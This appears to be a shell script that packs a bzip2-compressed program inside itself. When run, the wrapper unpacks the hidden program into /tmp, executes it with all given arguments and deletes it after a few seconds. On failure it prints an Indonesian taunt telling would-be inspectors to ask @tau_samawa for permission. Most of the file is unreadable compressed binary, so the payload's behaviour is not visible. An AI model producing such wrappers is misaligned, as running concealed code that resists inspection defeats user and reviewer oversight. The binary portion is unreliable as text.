#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY9��! V��e����?�������@D@  � ���O{���k{�z ��5?Ji��d�2�M=@h���4�  ���&5M��z�M@ �      h JzH��dF�        �$jx��h􆍨  2 2 �    �Bj0"bb�4�OI�!�&5 ɵ�#M4�NHI7{�g�y.�B��g� ��HR!#?�ą �G�h(c�O �J�Ӝ�<������L!��S����d�D�='��!V�C�2�%4��ٕZ��p4�b�_�2�6�S���=X撊Zh�#b�NHt���=�&@Jw�n3&���,��ۃ�-⪫J1�`��-qt��`�8���+�v��4������DJ&��hRa�������x��L6�dR�F�4K�'>���Dv*�!
�)�ً�Nyvl�'N�%����2�̡92�(p@�"���x�&�%�S}`�ZCف�M�,  c�
�n�B6G u%�2�i��$�����	Brm����W�
&�p:X��D\#���kqmJR��=M]F�飠 �*��B@� ABA������aQ�Z@����b�튖��6�@�%I=$��%�$�	�A�ϣ� 0 �@0m�%"���H*z�BT����\;�@�H��������f�/�^<O��������&��L�:������Fs��ޥ�m����g�A�=@�|$��� ��a�YzC1
�
̮�2G��� ,��`�X6�B�k���� �Z�hc�%P["U�<�j�R�1�C�?�p�5�D2 ���#UUiZ PT�R3��Ra�ȧ���s,��D��R� T���O��E)B*��K�g�@[bJ�Ҟ�B�\1� ����²�0X��.���@u�����]8�X��[3�a7��U�5��@i�·�g�S�����>�@��$L���}�F���'��b<�#?h�(+(���
���O�~��S���z�L���ƘS(_��F:���6��Üz�f�t4G	Y�ڬ�~թm��0a@`
D�{)��U�2SRy��le�5+��=�9�[é�������D����$>.=Om�C9#�P�i�k� ��qH���q�� �n{u3�XH��I@u�� �}�X����r�,B}�$�$��cKB{��e
d.��	 A��P�_�X�ji�	��CW��^t�s�'Z�'�2s0`?��&��# Iu�aVJ'*X$���!-�x�GX.H���ww�s2��c��3\Fw69V4pk�>% ud��=@�XTN���Ԑ��Xܾ�BT@�P T�Q��;���PC�X�d��%��j�*B�*i��H�
4�� 